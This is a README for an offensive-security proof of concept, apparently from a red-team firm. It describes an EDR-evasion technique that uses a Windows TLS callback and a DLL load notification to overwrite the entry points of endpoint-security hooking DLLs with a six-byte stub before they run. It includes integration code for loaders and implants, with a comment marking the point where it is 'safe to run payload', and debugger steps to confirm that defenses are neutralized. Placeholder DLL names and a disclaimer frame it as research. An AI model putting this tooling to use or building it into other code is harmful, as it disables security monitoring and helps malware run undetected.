# Precut

---

[![Platform](https://img.shields.io/badge/Platform-Windows%20x64-blue.svg)](#build-requirements) [![Language](https://img.shields.io/badge/Language-C-brightgreen.svg)](precut.c) [![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE) [![Toolchain](https://img.shields.io/badge/Toolchain-MSVC%20v143-555555.svg)](#build-requirements) [![Type](https://img.shields.io/badge/Type-Security%20Research-red.svg)](#scope-and-limitations)

A proof-of-concept demonstrating how to prevent EDR user-mode hooking DLLs from initializing by exploiting a timing window in the Windows PE loader — TLS callbacks execute before `NtTestAlert` drains the kernel-queued APCs that deliver the hooking engine into the process. Precut registers a DLL load notification from within that window and overwrites each target's entry point with a six-byte stub before `DllMain` ever runs.

> **Complete Technical Write-Up:** For the full analysis — from kernel callback to user-mode hook installation — including the reverse engineering of how the timing window was found, why it exists, and what its boundaries are, read the blog post:
> [EDR Analysis: TLS Callbacks and User-Mode Hook Initialization](https://redops.at/en/blog/edr-analysis-tls-callbacks-and-user-mode-hook-initialization)

## :warning: Disclaimer

**This project is for educational and security research purposes only.**

This code demonstrates security concepts and should only be used in controlled environments for learning, testing, or legitimate security research. The author does not condone malicious use and accepts no responsibility for misuse of this code. Use at your own risk and only on systems you own or have explicit permission to test.

---

## Codex

This repository ships two files. Each one is the complete technique — they differ in how you consume it.

| File | What it is | When to use it |
|---|---|---|
| **`precut.c`** | Self-contained proof-of-concept. All logic inline, heavily commented, builds via `PrecutCore.sln`. | You are reading the blog post, studying the technique, or running it standalone on a lab VM. |
| **`precut.h`** | Single-header library. Same mechanism, packaged as a reusable API behind `#define PRECUT_IMPLEMENTATION`. | You are integrating Precut into an existing loader, implant, or toolchain. |

`precut.c` is the reference implementation — the code the blog walks through line by line. It compiles into its own binary and does everything itself: TLS registration, PEB walk, notification callback, entry-point write, return from `main`. No external dependencies, no API to learn.

`precut.h` is what you `#include` when you already have a project. It exposes `precut_arm()` / `precut_disarm()`, a compile-time target macro system, a stub callback, and an atomic counter — the pieces a loader needs to integrate the technique without copy-pasting internals.

There is no `examples/` folder. `precut.c` is the example. Integration snippets for `precut.h` are below.

---

## How It Works

```
CreateProcessW
└─ LdrpInitializeProcess
   ├─ Map EXE + dependencies
   ├─ EXE TLS callbacks              ◄── Precut runs here
   ├─ NtTestAlert                    ◄── EDR's APC drains here
   │    └─ EDR DLLs mapped
   │         └─ LdrpSendDllNotifications  ◄── Precut's observer fires here
   │              └─ LdrpCallInitRoutine   (DllMain — but Precut already stubbed the entry)
   ├─ PE entry (mainCRTStartup)
   └─ main
```

When Windows creates a process, `ntdll!LdrpInitializeProcess` fires TLS callbacks early — before the CRT, before `main`, and before `NtTestAlert`. That last point matters. `NtTestAlert` drains the thread's APC queue, and EDR kernel drivers that want to inject a hooking engine typically queue that injection as an APC. Until the loader reaches `NtTestAlert`, the APC sits undelivered. The hooking DLL does not exist in the process yet.

Precut lives in that window. From inside a TLS callback it does two things:

**Write A** walks the PEB's `InMemoryOrderModuleList` for targets that are already mapped. On a typical APC-based EDR this finds nothing, but it covers edge cases where an image lands before TLS.

**Write B** registers a DLL load notification via `LdrRegisterDllNotification`. When the loader maps a new image, the notification fires *after* the image is in the address space but *before* `DllMain` runs. For each matching basename, Precut walks the PE headers to `AddressOfEntryPoint`, flips the page to `PAGE_EXECUTE_READWRITE`, and writes:

```asm
B8 01 00 00 00    mov eax, 1
C3                ret
```

The DllMain contract: return nonzero means "initialization succeeded." The loader calls what it thinks is `DllMain` and gets the stub. No hook-installation routines execute. No `E9` jmp patches land on syscall stubs. The images stay mapped but inert.

---

## Building the PoC (precut.c)

Open `PrecutCore.sln` in Visual Studio 2022, build `Release|x64`. Or from a Developer Command Prompt:

```
msbuild PrecutCore.sln /p:Configuration=Release /p:Platform=x64
```

Confirm the TLS directory exists:

```
dumpbin /tls x64\Release\PrecutCore.exe
```

Non-zero callback address means the TLS plumbing is live. If the section is missing, verify `/INCLUDE:_tls_used` under Linker → Input → Force Symbol References.

---

## Integrating the Library (precut.h)

### Minimal standalone binary

The shortest path — equivalent to what `precut.c` does, but built from the header:

```c
#define PRECUT_IMPLEMENTATION
#define PRECUT_TLS_AUTO

#define PRECUT_TARGETS                  \
    PRECUT_PREFIX(L"edr_hook")          \
    PRECUT_PREFIX(L"edr_dev")           \
    PRECUT_EXACT(L"edrclient64.dll")

#include "precut.h"

int main(void)
{
    (void)g_precut_tls_sentinel;
    precut_disarm();
    return 0;
}
```

`PRECUT_TLS_AUTO` emits the `.CRT$XLB` plumbing so `precut_arm()` fires at process attach. The sentinel touch keeps the TLS directory alive. `precut_disarm()` unregisters the notification after it has done its work.

### Loader with its own TLS callback

When your loader already owns the TLS slot, skip `PRECUT_TLS_AUTO` and call `precut_arm()` yourself:

```c
#define PRECUT_IMPLEMENTATION

#define PRECUT_TARGETS                  \
    PRECUT_PREFIX(L"edr_hook")          \
    PRECUT_EXACT(L"edrclient64.dll")

#include "precut.h"

static void on_stub(const wchar_t *name, void *base, int ok)
{
    /* Log, count, or gate on this — runs inside TLS, no CRT available.
     * Use WriteFile(GetStdHandle(...)) if you need output here. */
    (void)name; (void)base; (void)ok;
}

static void NTAPI my_tls_callback(PVOID h, DWORD reason, PVOID r)
{
    (void)h; (void)r;
    if (reason != DLL_PROCESS_ATTACH) return;
    precut_set_callback(on_stub);
    precut_arm();
}

#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma section(".CRT$XLB", long, read)
__declspec(allocate(".CRT$XLB"))
    PIMAGE_TLS_CALLBACK g_my_tls = my_tls_callback;
__declspec(thread) static volatile int g_tls_keep = 0;

int main(void)
{
    (void)g_tls_keep;

    if (precut_stub_count() > 0) {
        /* EDR hooks neutralized — safe to run payload */
    }

    precut_disarm();
    return 0;
}
```

### Target macros

| Macro | Behavior |
|---|---|
| `PRECUT_PREFIX(L"name")` | Case-insensitive prefix + `.dll` suffix guard. Matches `name12345.dll`, not `name.cfg`. |
| `PRECUT_EXACT(L"name.dll")` | Case-insensitive exact basename match. |

### API

| Function | Description |
|---|---|
| `precut_arm()` | PEB walk (Write A) + register notification (Write B). Call before `NtTestAlert`. |
| `precut_disarm()` | Unregister the notification. Reduces forensic surface. |
| `precut_set_callback(fn)` | `void fn(const wchar_t *name, void *base, int ok)` — fires after each stub attempt. |
| `precut_stub_count()` | Entry points stubbed so far. Zero means nothing matched. |

### Compile-time options

| Define | Effect |
|---|---|
| `PRECUT_IMPLEMENTATION` | Include the implementation. Exactly one translation unit. |
| `PRECUT_TLS_AUTO` | Auto-register a TLS callback that calls `precut_arm()`. Implies `PRECUT_STATIC`. |
| `PRECUT_STATIC` | All API functions `static`. |

---

## Placeholder DLL Names

Every target in this repository is a non-functional placeholder — `edr_hook`, `edr_dev`, `edrclient64.dll`, `edrclient.dll`. They match nothing on a live system. Replace them with the actual basenames of the hooking DLLs from your target EDR before building. The blog post covers identification via kernel debugger, `lm` output, and breakpoints on `ntdll!LdrLoadDll`.

---

## Build Requirements

MSVC only. The TLS callback registration depends on four pieces of MSVC-specific machinery:

1. **`#pragma section(".CRT$XLB", long, read)`** — places the callback pointer into the CRT's TLS array. The linker merges `.CRT$XLA` through `.CRT$XLZ` alphabetically. MinGW does not guarantee the same merge behavior.
2. **`__declspec(allocate(".CRT$XLB"))`** — pins the pointer to that section. No GCC equivalent.
3. **`__declspec(thread)`** — keeps the TLS directory alive. Without it, the linker may optimize away the entire apparatus.
4. **`/INCLUDE:_tls_used`** — forces emission of `IMAGE_TLS_DIRECTORY64`.

Visual Studio 2022, v143 toolset, x64. The project uses `/MT` (static CRT).

---

## Verification

Run the binary on a lab VM with the target EDR active. Attach WinDbg before launch.

**1. Confirm TLS ran before the APC:**

```
bp ntdll!NtTestAlert
g
```

At the breakpoint, the notification is already registered but the EDR DLLs have not been mapped.

**2. Continue, inspect the targets:**

```
g
lm m edr_*
```

Replace `edr_*` with your target pattern. Modules appear mapped but entry points contain `B8 01 00 00 00 C3`.

**3. Verify syscall stubs are clean:**

```
db ntdll!NtProtectVirtualMemory L6
```

Clean: `4C 8B D1 B8 xx xx` (`mov r10, rcx` / `mov eax, <syscall_number>`). If byte `+3` is `E9`, the hooks landed — wrong target list or the product injects before TLS.

---

## Scope and Limitations

Precut targets one initialization order: EDR products that deliver their user-mode engine via a kernel APC draining at `NtTestAlert`, after EXE TLS callbacks have executed. Common pattern, not the only one.

Products that map their hooking DLL synchronously from a kernel image-load callback will have the module present before TLS runs. Write A partially covers this, but if the EDR's `DllMain` also completes synchronously, the hooks are installed before Precut acts. The blog post discusses this in detail.

The undocumented loader structures and notification API have been stable across Windows 10 and 11 (tested through 10.0.26100). Windows 7/8 expose `LdrRegisterDllNotification` but have not been verified.

x64 only. PEB via `gs:[0x60]`, 64-bit optional header layout, x64 stub encoding.

---

## Author

Daniel Feichter ([@VirtualAlllocEx](https://github.com/VirtualAlllocEx)) — [RedOps](https://redops.at)
